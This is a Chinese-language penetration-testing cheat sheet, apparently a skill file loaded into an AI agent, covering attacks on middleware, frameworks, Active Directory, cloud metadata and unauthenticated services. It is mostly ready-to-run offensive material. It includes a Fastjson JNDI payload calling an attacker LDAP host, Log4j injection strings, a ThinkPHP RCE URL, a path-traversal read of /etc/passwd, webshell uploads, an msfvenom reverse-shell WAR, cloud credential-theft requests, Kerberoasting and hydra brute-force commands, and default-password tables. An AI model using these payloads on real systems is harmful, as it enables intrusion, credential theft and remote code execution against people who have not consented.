# 中间件/基础设施/未授权速查（middleware-unath）

> 来源：jiejieskill SKILL.md 拆分（2026-08-11）。由 SKILL.md 相应章节按需加载。

### 6.6 基础设施/网络漏洞

```bash
# Nuclei 模板扫描（快速全量）
nuclei -u http://target.com -t cves/ -severity critical,high
nuclei -l targets.txt -t ~/nuclei-templates/ -o nuclei-results.txt

# Nessus / OpenVAS（深度扫描）
# → 导入目标 → 运行扫描策略 → 导出报告

# 手动版本验证
searchsploit apache 2.4.49
searchsploit -m 50383     # 下载 exploit
```

### 6.7 Active Directory 侦察
```bash
# BloodHound 数据收集
bloodhound-python -d target.local -u user -p pass -ns <DC_IP> -c All
SharpHound.exe -c All

# PowerView (PowerShell)
Get-NetUser | select samaccountname,serviceprincipalname
Get-NetGroup "Domain Admins" | select member
Get-NetComputer | select name,operatingsystem
Find-LocalAdminAccess

# Kerberoastable 用户
GetUserSPNs.py target.local/user:pass -dc-ip <DC_IP>
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# AS-REP Roastable
GetNPUsers.py target.local/ -usersfile users.txt -no-pass -dc-ip <DC_IP>
```

### 6.8 云环境侦察
```bash
# AWS
aws s3 ls s3://bucket-name --no-sign-request
# EC2 元数据服务
curl http://169.254.169.254/latest/meta-data/

# Azure
# 检查 AZURE_CLIENT_ID / MSI_ENDPOINT
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H "Secret:$IDENTITY_HEADER"

# GCP
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys?alt=text" -H "Metadata-Flavor: Google"
```


### 6.10 中间件 / 框架 / 反序列化漏洞

> 国内渗透命中率最高的攻击面之一。**识别指纹 → 版本 → 命中 Nday → 验证**，一条线走完。

#### Java 反序列化（重点）
```bash
# Apache Shiro：rememberMe cookie → AES key 爆破
#   1. 发送 rememberMe=xxx 无效 cookie，响应含 rememberMe=deleteMe 即 Shiro
#   2. 爆破 AES key（shiro_attack 工具 或 常用 key 列表）
#   3. 拿到 key → 生成恶意序列化 payload（CC链/CB链）→ 带 cookie 触发 RCE
#   GUI工具：github.com/SummerSec/ShiroAttack2 / shiro_attack.zip
#   常见硬编码key：kPH+bIxk5D2deZiIxcaaaA== / 2Av2hgiG0eqKbqW6gWBSPg== ...

# Fastjson：JSON 反序列化 autotype
#   识别：Content-Type: application/json；请求体 {"@type":"java.lang.AutoCloseable"...
#   1.2.24/1.2.25-1.2.47（缓存绕过）/ 1.2.68（新绕过）各有 payload
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}
#   工具：JNDI-Exploit-Kit / jndi_tool 一键起恶意 LDAP/RMI
#   检测：dnslog 验证 {"@type":"java.net.InetAddress","val":"xxx.dnslog.cn"}

# Weblogic：T3/IIOP 反序列化
#   CVE-2019-2725（wls9-async / 通配符上传）、CVE-2020-14882（后台认证绕过→RCE）
#   工具：weblogicScan / weblogic_cmd 批量探测

# XStream（CVE-2021-21345 等）/< 原生 JDK：URLDNS 探测 → CommonsCollections 链
#   ysoserial 生成链：java -jar ysoserial.jar CommonsCollections6 "cmd"
#   URLDNS 反序列化验证：java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn"
```

#### Log4j2（CVE-2021-44228）
```bash
# 识别：日志打印用户可控输入（User-Agent/X-Forwarded-For/用户名）
# 检测：${jndi:ldap://xxx.dnslog.cn}   → dnslog 回显即存在
# 利用：${jndi:ldap://attacker:1389/Exploit} → JNDI 打恶意类 → RCE
# 工具：JNDIExploit / log4j-scan（批量）
```

#### 国内框架 / 产品 Nday
```bash
# ThinkPHP：/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
#   RCE 版本：5.0.x / 5.1.x（getshell 需写文件）；3.x RCE
# Struts2：S2-045(Content-Type)、S2-057(URL尾缀 %{(#_='multipart/form-data')...)、S2-062、S2-066
#   https://cwiki.apache.org/confluence/display/WW/Security+Bulletins
# Spring Boot Actuator：/actuator/env /actuator/heapdump /actuator/gateway
#   heapdump 泄露密码 → jhat/Eclipse MAT 分析；gateway → SpEL RCE(CVE-2022-22947)
# Spring4Shell：CVE-2022-22965（需 Tomcat + WAR 打包）
# 国内 OA Nday（按版本识别后搜对应 exp）：
#   泛微 e-cology（SQLi/RCE）、致远 OA（RCE/文件上传）、
#   用友 NC/GRP（RCE/SQLi）、蓝凌 OA、通达 OA、帆软报表（目录穿越/RCE）
#   工具：fscan（内置常见漏洞利用）/ 各 OA 专项 exp

# 开源框架 Nday（国内最高频，指纹识别命中即可试）
# 若依 RuoYi（若依管理系统）
#   默认弱口令：admin/admin123
#   前台 SQL 注入（如 viewName/定时任务参数）、后台定时任务 RCE
#   RuoYi 4.x / 5.x 各版本均有 Nday；Shiro 集成版本可测反序列化
#   工具：ruoyi 专项 exp / fscan（内置部分）
# JeecgBoot
#   默认口令：admin/123456、guest/guest
#   前台 SQL 注入（CVE-2023-34659 等）、jmreport 报表任意文件读取/上传
#   工具：jeecg 专项 exp / fscan
# 其他开源框架：若依衍生(RuoYi-Vue/Cloud)、Layui 后台、Spring Cloud 微服务网关
#   识别：页面版权/JS 特征/登录框文案 → 搜索引擎搜「框架名 Nday」

# 其他基础设施 / 国内产品 Nday（vuln-catalog 2.3/2.5/2.7）
# HTTP.sys（CVE-2015-1635，IIS 6.0 以上）：
#   畸形 Range 头 → 蓝屏 / 内核内存读取
#   检测：nuclei -t cves/CVE-2015-1635 ；msf auxiliary/scanner/http/ms15_034_http_sys_memory_dump
#   curl -sI -H "Range: bytes=0-18446744073709551615" http://target/ → 返回 416 且无 "Requested Range Not Satisfiable" 即可能
# H3C IMC（智能管理中心，CVE-2017-7803 等前台 RCE）：
#   指纹：/imc/login.jsf /imc/ 页面、H3C 版权
#   利用：搜 H3C iMC 版本对应 exp；fscan 内置部分；nuclei -t cves/
# GitLab（CVE-2021-22205 ExifTool 无认证 RCE、CVE-2021-22214 SSRF、CVE-2022-2185）：
#   指纹：/help /users/sign_in 页面 GitLab 特征、版本页
#   CVE-2021-22205：上传恶意图片（ExifTool 解析）→ 无认证 RCE
#   检测：nuclei -t cves/gitlab* ；searchsploit gitlab
```

#### Web 中间件专项（Nginx / Apache / IIS / Tomcat / JBoss）
```bash
# ============ Nginx ============
# 解析漏洞 CVE-2013-4547（空格/空字节截断）
/1.jpg%20%00.php                       # 旧版本解析截断执行
# 目录穿越 CVE-2021-23017（alias 配置错误）
#   location /files/ { alias /home/user/; }  # alias 末尾缺 / → /files../ 越权
# off-by-slash：/..;/ 绕过代理路径
# CRLF 注入：%0d%0a 注入响应头
# try_files 配置错误 → 源码泄露 / 路由绕过

# ============ Apache ============
# 多后缀解析（旧版）：1.php.jpg 按 .php 解析
# .htaccess 上传 → 启用 php 解析
# 目录穿越 CVE-2021-41773 / CVE-2021-42013（2.4.49 / 2.4.50）
curl --path-as-is "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
# mod_proxy 配置错误 → SSRF / 内网访问
# HTTP Request Smuggling（CL.TE / TE.CL）
# OPTIONS 请求泄露中间件与版本

# ============ IIS ============
# 短文件名 8.3 枚举：iis_shortname_Scanner 猜解后台文件
# PUT 上传（WebDAV 开启）：
curl -X PUT -d "<%=shell%>" http://target/shell.txt
# 解析漏洞：1.asp;.jpg / 1.aspx.jpg / 1.asp:.jpg

# ============ Tomcat ============
# 后台弱口令 → 部署 WAR getshell
#   /manager/html：admin/admin、tomcat/tomcat、admin/manager
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o shell.war
#   → 上传部署 → 访问 shell.war/shell.jsp 触发
# AJP 文件读取 CVE-2020-1938（Ghostcat，影响 6.x-9.x）
python2 ajpShooter.py http://target:8080/ WEB-INF/web.xml
nmap --script http-tomcat-cve-2020-1938 <target>
# PUT 上传 CVE-2017-12615（8.5.0-8.5.13）
curl -X PUT -d 'shell.jsp' "http://target/shell.jsp/"        # 或 %20 结尾绕过
# 版本识别：/docs 页、报错页版本号、/manager 响应头

# ============ JBoss / WebSphere ============
# JBoss：/invoker/JMXInvokerServlet 反序列化 RCE
#   /admin-console 后台弱口令 → 部署 getshell
# WebSphere：/console 后台 → 部署应用 getshell
# 端口：JBoss 8080/9990，WebSphere 9043/9060
```

#### 消息 / 缓存中间件（ActiveMQ / RabbitMQ / Kafka）
```bash
# ActiveMQ：CVE-2023-46604（OpenWire 协议反序列化 RCE）、/admin 弱口令
curl -u admin:admin http://target:8161/admin            # 8161 管理端口
# RabbitMQ：默认 guest/guest、/api 未授权
curl -u guest:guest http://target:15672/api/overview     # 15672 管理端口
# Kafka：未授权读取 topic（9092）
kafkacat -b target:9092 -L
# 其余缓存/消息中间件未授权 → 见下方 6.11 未授权访问（Redis/ZooKeeper/Memcached/Dubbo）
```

#### 数据库中间件专项（Oracle / MSSQL / MySQL / PostgreSQL）
```bash
# ============ 数据库指纹识别 ============
# 端口：Oracle 1521、MSSQL 1433、MySQL 3306、PostgreSQL 5432
nmap -sV -p 1521,1433,3306,5432 <target>
nc -nv <target> 3306          # MySQL 裸连 banner 报版本
# 工具：fscan / hydra 批量弱口令

# ============ 弱口令 / 未授权检测 ============
hydra -L users.txt -P pass.txt <target> mssql
hydra -L users.txt -P pass.txt <target> mysql
hydra -L users.txt -P pass.txt <target> oracle
# 未授权：MSSQL sa/空、MySQL root/空、MongoDB/Redis 见下方 6.11 未授权访问

# ============ 拿到库权限后 → 提权 / getshell 见 `post-exploitation.md` 8.10 ============
# MSSQL xp_cmdshell、MySQL UDF / general_log 写 webshell、Redis 写计划任务/SSH key
```

| 数据库 | 默认 / 常见弱口令 | 说明 |
|--------|-----------------|------|
| Oracle | `system/oracle`、`sys/oracle`、`system/123456` | 1521 |
| MSSQL | `sa/空`、`sa/sa`、`sa/123456`、`sa/Password1` | 1433，高权限 |
| MySQL | `root/空`、`root/root`、`root/123456` | 3306 |
| PostgreSQL | `postgres/postgres` | 5432 |
| MongoDB | 无认证（见 6.11） | 27017 |
| Redis | 无认证 / requirepass 弱口令（见 6.11） | 6379 |

> 提示：国内目标常见 `root/root`、`sa/1`、`oracle/oracle` 等极弱口令；拿到 MSSQL/MySQL 高权限直接走 8.10 提权链条。

#### Spring 生态全家桶（Boot / Security / Cloud / Framework）
```bash
# ============ Spring Boot Actuator 端点 ============
/actuator /actuator/env /actuator/heapdump /actuator/mappings
/actuator/beans /actuator/loggers /actuator/configprops /actuator/gateway
# heapdump → 下载 → jhat / Eclipse MAT 分析：数据库口令、AK/SK、token
# env /configprops → 明文泄露配置（数据库、Redis、第三方密钥）
# 工具：SpringBootScan（一键探测全部端点 + 常见漏洞）
```

| 组件 | CVE | 说明 |
|------|-----|------|
| Spring Cloud Gateway | CVE-2022-22947 | SpEL RCE（Actuator gateway 接口）|
| Spring Cloud Function | CVE-2022-22963 | SpEL RCE（路由 header）|
| Spring Framework | CVE-2022-22965 | Spring4Shell（Tomcat + WAR 打包）|
| Spring Framework | CVE-2023-20860 / 20861 | 安全绕过 / 内存马 |
| Spring Boot | CVE-2023-20883 | 拒绝服务 |
| Spring Security | CVE-2023-34034 | 授权绕过（特定版本）|
| Spring WebMVC | CVE-2023-34039 / 34040 | 拒绝服务 / 绕过 |
| Spring Framework | CVE-2024-22243 / 22259 / 22262 | SSRF / 反序列化 / 安全绕过 |
| Spring Security | CVE-2024-22233 | 默认登录认证绕过 |
| SnakeYAML | CVE-2022-1471 | YAML 反序列化 RCE（Spring 常携带依赖）|
| Jackson | - | 反序列化链（Fastjson 同族）|
| Spring Session | - | 会话固定 / 会话失配测试 |

```bash
# ============ Spring 专项工具与利用流程 ============
# SpringBootScan：端点探测 + 常见漏洞
# spring4shell-scan：CVE-2022-22965 批量检测
# 利用要点：/actuator 找入口 → 版本/组件识别 → 命中对应 CVE
#   → 如 /actuator/gateway 存在 → CVE-2022-22947 SpEL 打内存马
#   → heapdump 泄露凭据 → 登数据库/Redis → 8.10 提权
```

#### 中间件默认口令速查表
| 中间件 | 默认口令 | 管理入口 |
|--------|---------|---------|
| Tomcat | admin/admin、tomcat/tomcat、admin/manager | /manager/html |
| JBoss | admin/admin | /admin-console |
| WebLogic | weblogic/Oracle@123、system/password、weblogic/welcome1 | /console |
| Jenkins | admin/admin、admin/空 | /login |
| RabbitMQ | guest/guest | :15672 |
| ActiveMQ | admin/admin | :8161/admin |
| Grafana | admin/admin | :3000 |
| ZooKeeper | 无认证 | :2181 |
| Nacos | nacos/nacos（需先测试） | :8848/nacos |
| 宝塔面板 | 安装时生成（随机） | :8888 |

#### 中间件指纹识别速查
```bash
# 1. 响应头
curl -sI $URL
#   Server: nginx/1.18.0 | Apache/2.4.49 | Microsoft-IIS/10.0 | Tengine（阿里）
#   X-Powered-By: PHP/5.6 | ASP.NET | Express
# 2. 默认路径探测（命中即指纹+入口）
#   Tomcat: /manager/html /docs     JBoss: /admin-console /invoker/
#   WebLogic: /console               Spring Boot: /actuator/env
#   Nginx: /nginx_status             宝塔: /bt 面板
# 3. 报错页/404 特征：IIS 徽标、Apache 蓝底、Tomcat 猫头、Nginx 简洁页
# 4. 工具：whatweb / httpx -tech-detect / ehole（红队指纹）/ wappalyzer
# 5. 版本命中 → searchsploit / nuclei -t cves/ 专项模板验证
```

> 🔗 **反序列化 gadget 链与 payload 深挖 → secknowledge `references/web-deser.md`**；框架 CVE 库 → secknowledge `references/web-deployment-security.md`。

### 6.11 未授权访问漏洞

> **不加认证就能拿数据 / 打 RCE**，国内扫描器最喜欢碰的一类。批量探测命中率高。

```bash
# 通用探测姿势：nmap 扫出端口 → 直接裸连看 banner / 默认页
nmap -sV -p 6379,27017,9200,2375,8088,2181,80,8080,3000,11211 <target>
```

| 服务 | 默认端口 | 探测命令 | 危害 |
|------|---------|---------|------|
| Redis | 6379 | `redis-cli -h <ip> info` / `keys *` | RCE（写计划任务/SSH key）|
| MongoDB | 27017 | `mongo <ip> --eval 'db.getCollectionNames()'` | 数据库拖库 |
| Elasticsearch | 9200 | `curl http://<ip>:9200/_cat/indices` | 数据泄露/集群接管 |
| Docker API | 2375/2376 | `curl http://<ip>:2375/version` | 容器逃逸→宿主机RCE |
| Kubernetes | 6443/10250 | `curl -k https://<ip>:6443/version` / `kubelet` 10250 | 集群接管 |
| Hadoop YARN | 8088 | `curl http://<ip>:8088/cluster` | 提交任务RCE |
| Zookeeper | 2181 | `echo envi \| nc <ip> 2181` | 数据/配置泄露 |
| Dubbo | 20880 | `dubbo` 服务直连 | 反序列化RCE |
| Jenkins | 8080 | 未认证 /script 页 | Groovy RCE |
| Grafana | 3000 | `/api/search` 未认证 | 数据泄露 |
| CouchDB | 5984 | `curl http://<ip>:5984/_all_dbs` | 数据库泄露 |
| Memcached | 11211 | `echo stats \| nc <ip> 11211` | 数据泄露/DRDoS |
| NFS | 2049 | `showmount -e <ip>` | 文件系统挂载 |
| rsync | 873 | `rsync rsync://<ip>/` | 任意文件读写 |
| Docker Registry | 5000 | `curl http://<ip>:5000/v2/_catalog` | 镜像拉取/篡改 |

```bash
# 批量检测（fscan 内置未授权探测）
fscan -h 10.0.0.0/24 -np -nobr -p 6379,9200,2375,8088   # 只测未授权
# 手工：Redis 打 RCE 见 `post-exploitation.md` 8.10；YARN/Jenkins RCE 见 `quickstarts.md` 10.8
```

---

